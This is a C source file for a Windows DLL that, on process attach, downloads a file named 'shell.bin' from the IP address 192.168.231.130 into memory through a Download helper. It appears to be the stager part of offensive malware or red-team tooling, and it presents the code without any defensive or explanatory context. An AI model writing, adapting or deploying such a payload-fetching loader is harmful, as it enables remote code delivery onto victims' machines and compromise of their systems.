#include <windows.h>
#include "common.h"

unsigned char* pPayload = NULL;
PSTR url = "192.168.231.130";
PSTR endpoint = "shell.bin";
SIZE_T sSize = -1;

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)
{
    switch (dwReason)
    {
        case DLL_PROCESS_ATTACH:
            sSize = Download(&pPayload, url, endpoint, FALSE);
            if(sSize == -1)
            {
                printf("[!] Failed to fetch payload from server!\n");
                return FALSE;
            }
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}